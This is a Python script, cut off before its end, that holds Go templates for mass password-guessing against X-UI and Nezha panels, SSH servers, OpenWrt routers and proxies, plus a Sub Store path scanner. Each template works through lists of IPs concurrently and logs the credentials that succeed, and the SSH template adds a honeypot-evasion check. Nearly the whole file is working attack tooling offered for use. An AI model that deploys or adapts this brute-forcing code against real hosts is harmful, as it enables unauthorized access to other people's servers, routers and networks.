# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util # 修复导入错误所需
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print("❌ 错误：核心 Python 模块缺失！")
    print("缺失的模块是: {}".format(e.name))
    print("请先手动安装所有依赖：")
    print("python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama --break-system-packages")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板（已净化并增加注释） ===========================
# 为防止BOM字符问题，所有Go模板都重写为行列表

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// worker 函数从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	// 创建可复用的 HTTP客户端, 跳过TLS验证并禁用长连接以提高性能",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试所有用户名和密码组合进行登录",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	// 尝试从完整的URL中解析出 'ip:port'",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return } // 如果格式不正确则跳过",
    "	ip, port := parts[0], parts[1]",
    "	// 遍历所有用户名和密码",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// 1. 尝试 HTTP 登录",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 2. 如果 HTTP 失败, 尝试 HTTPS 登录",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue // 如果两种协议都失败，则尝试下一个密码",
    "			}",
    "			// 检查响应状态码是否为200 OK",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					// 解析JSON响应并检查 'success' 字段",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							// 登录成功, 写入结果并立即返回",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			// 丢弃响应体以重用连接",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "// main 函数是程序的入口，负责读取文件和初始化并发任务",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	// 用户名和密码列表由Python脚本填充",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) == 0 || len(passwords) == 0 {",
    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
    "		return",
    "	}",
    "	// 创建带缓冲的任务通道",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	// 启动指定数量的 worker goroutine",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	// 逐行读取输入文件并将任务发送到通道",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks) // 关闭通道，通知 worker 任务已结束",
    "	wg.Wait() // 等待所有 worker 完成",
    "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// worker 函数从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	// 创建可复用的 HTTP客户端, 跳过TLS验证并禁用长连接",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, httpClient)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试所有用户名和密码组合进行登录",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	// 遍历所有用户名和密码",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			// 哪吒面板使用JSON格式提交",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// 1. 尝试 HTTP 登录",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 2. 如果 HTTP 失败, 尝试 HTTPS",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			// 检查响应状态码是否为200 OK",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					// 解析JSON响应并检查 'success' 或 'token' 等关键字",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						// 哪吒面板成功登录的响应中包含 'data' -> 'token'",
    "						if data, ok := responseData[\"data\"].(map[string]interface{}); ok {",
    "							if _, tokenExists := data[\"token\"]; tokenExists {",
    "								file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "								resp.Body.Close()",
    "								return",
    "							}",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "// main 函数是程序的入口，负责读取文件和初始化并发任务",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "    if len(usernames) == 0 || len(passwords) == 0 {",
    "        fmt.Println(\"错误：用户名或密码列表为空。\")",
    "        return",
    "    }",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"log\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "// worker 函数从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试所有用户名和密码组合进行SSH登录",
    "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port) // 打印调试日志",
    "	// 遍历凭据",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {",
    "				// 登录成功后，进行蜜罐检测",
    "				if !isLikelyHoneypot(client) {",
    "					file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "				}",
    "				client.Close()",
    "				return // 找到一个成功的凭据后就停止",
    "			}",
    "		}",
    "	}",
    "}",
    "// trySSH 尝试使用给定的凭据进行一次SSH连接",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{",
    "		User:            username,",
    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 忽略主机密钥验证",
    "		Timeout:         {timeout} * time.Second,",
    "	}",
    "	client, err := ssh.Dial(\"tcp\", addr, config)",
    "    return client, err == nil, err",
    "}",
    "// isLikelyHoneypot 通过执行一个简单的命令来检测是否是交互式蜜罐",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true } // 无法创建session，可能是蜜罐",
    "	defer session.Close()",
    "	// 请求一个伪终端(PTY)",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	// 执行 'echo $((1+1))' 命令，正常shell应返回 '2'",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	// 如果返回结果不是 '2'，则很可能是蜜罐",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// worker 从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done()",
    "	// 创建可复用的 HTTP 客户端",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks {",
    "		processIP(line, file, paths, client)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试字典中的所有路径",
    "func processIP(line string, file *os.File, paths []string, client *http.Client) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" {",
    "		ipPort = u.Host",
    "	} else {",
    "		ipPort = strings.TrimSpace(line)",
    "	}",
    "	// 遍历所有可能的路径",
    "	for _, path := range paths {",
    "		if tryBothProtocols(ipPort, path, client, file) { break } // 找到一个就停止",
    "	}",
    "}",
    "// tryBothProtocols 尝试对给定的 IP:port 和路径，同时测试 http 和 https",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	// Sub Store 的一个通用API端点，用于验证面板是否存在",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	// 尝试 HTTP",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	// 尝试 HTTPS",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath))",
    "		return true",
    "	}",
    "	return false",
    "}",
    "// sendRequest 发送单个HTTP GET请求并验证响应",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
    "	if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
    "		if readErr != nil { return false, readErr }",
    "		// 成功的响应体中应包含特定的JSON结构",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
    "			return true, nil",
    "		}",
    "	}",
    "	io.Copy(io.Discard, resp.Body) // 丢弃不匹配的响应体",
    "	return false, nil",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	// 在此模式下, pass_list 实际上是路径列表",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, paths)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// worker 从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	// 创建一个特殊的HTTP客户端，它不会自动处理重定向",
    "	tr := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	client := &http.Client{",
    "		Transport: tr,",
    "		Timeout: {timeout} * time.Second,",
    "		// 捕获重定向是判断登录成功的关键",
    "		CheckRedirect: func(req *http.Request, via []*http.Request) error {",
    "			return http.ErrUseLastResponse",
    "		},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, file, usernames, passwords, client)",
    "	}",
    "}",
    "// processIP 针对单个URL/IP，尝试所有凭据组合",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}",
    "	trimmed := strings.TrimSpace(line)",
    "	// 如果输入行已经是URL，直接使用；否则，为其添加http和https前缀",
    "	if strings.HasPrefix(trimmed, \"http\") {",
    "		targets = append(targets, trimmed)",
    "	} else {",
    "		targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed)",
    "	}",
    "	for _, target := range targets {",
    "		u, err := url.Parse(target)",
    "		if err != nil { continue }",
    "		// 构造必要的HTTP头",
    "		origin := u.Scheme + \"://\" + u.Host",
    "		referer := origin + \"/\"",
    "		for _, username := range usernames {",
    "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password))",
    "					return // 登录成功，停止尝试",
    "				}",
    "			}",
    "		}",
    "	}",
    "}",
    "// checkLogin 发送一次登录请求并检查结果",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	// OpenWrt 使用 'luci_username' 和 'luci_password'作为表单字段",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
    "	if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Origin\", origin)",
    "	req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false ",
    "    }",
    "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body) // 必须消耗掉响应体",
    "	// 关键：检查响应中是否设置了名为 'sysauth_http' 的cookie",
    "	for _, c := range resp.Cookies() {",
    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
    "			return true // 找到cookie，表示登录成功",
    "		}",
    "	}",
    "	return false",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil {",
    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
    "		return",
    "	}",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# ==================== 代理模板修复 ====================
# 通用代理验证模板（支持SOCKS5, HTTP, HTTPS）
PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io/ioutil\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/net/proxy\"",
    ")",
    "// 全局变量，由Python脚本填充",
    "var (",
    "	proxyType    = \"{proxy_type}\" // 代理类型: socks5, http, https",
    "	authMode     = {auth_mode}      // 认证模式: 1-无, 2-字典, 3-组合",
    "	testURL      = \"http://myip.ipip.net\" // 用于验证代理的URL",
    "	realIP       = \"\"             // 本机的公网IP",
    ")",
    "// worker 从任务通道接收代理地址",
    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, outputFile)",
    "	}",
    "}",
    "// processProxy 根据认证模式，为单个代理尝试不同的凭据",
    "func processProxy(proxyAddr string, outputFile *os.File) {",
    "	var found bool // 标志，一旦找到可用的凭据就停止",
    "	checkAndFormat := func(auth *proxy.Auth) {",
    "        if found { return }",
    "		success, _ := checkConnection(proxyAddr, auth)",
    "		if success {",
    "            found = true",
    "			var result string",
    "			// 根据是否有认证信息，格式化输出结果",
    "			if auth != nil && auth.User != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			outputFile.WriteString(result + \"\\n\")",
    "		}",
    "	}",
    "	// 根据不同的认证模式执行",
    "	switch authMode {",
    "	case 1: // 无凭据",
    "		checkAndFormat(nil)",
    "	case 2: // 用户名/密码字典",
    "		usernames := {user_list}",
    "		passwords := {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				auth := &proxy.Auth{User: user, Password: pass}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	case 3: // 组合凭据 (user:pass)",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 {",
    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	}",
    "}",
    "// getPublicIP 获取本机的公网IP地址",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
    "	if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { return \"\", err }",
    "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(body)",
    "	// 特别处理ipip.net的返回格式",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			return ipParts[0], nil",
    "		}",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "// checkConnection 是核心函数，负责创建代理连接并访问测试URL",
    "func checkConnection(proxyAddr string, auth *proxy.Auth) (bool, error) {",
    "	transport := &http.Transport{ ",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	timeout := {timeout} * time.Second",
    "	// 根据代理类型配置 transport",
    "	if proxyType == \"http\" || proxyType == \"https\" {",
    "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "		} else {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "		}",
    "		proxyURL, err := url.Parse(proxyURLString)",
    "		if err != nil { return false, err }",
    "		transport.Proxy = http.ProxyURL(proxyURL)",
    "       if proxyType == \"https\" {",
    "           // HTTPS代理需要特殊的DialTLSContext",
    "           transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "               dialer := &net.Dialer{Timeout: timeout}",
    "               return tls.DialWithDialer(dialer, network, proxyAddr, &tls.Config{InsecureSkipVerify: true})",
    "           }",
    "       }",
    "	} else { // SOCKS5 代理",
    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{",
    "			Timeout:   timeout,",
    "			KeepAlive: 30 * time.Second,",
    "		})",
    "		if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "			return dialer.Dial(network, addr)",
    "		}",
    "	}",
    "	// 为每次检查创建一个独立的客户端",
    "	httpClient := &http.Client{ Transport: transport, Timeout: timeout }",
    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
    "	if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\")",
    "	resp, err := httpClient.Do(req)",
    "	if err != nil { ",
    "        if resp != nil { resp.Body.Close() }",
    "        return false, err ",
    "    }",
    "	defer resp.Body.Close()",
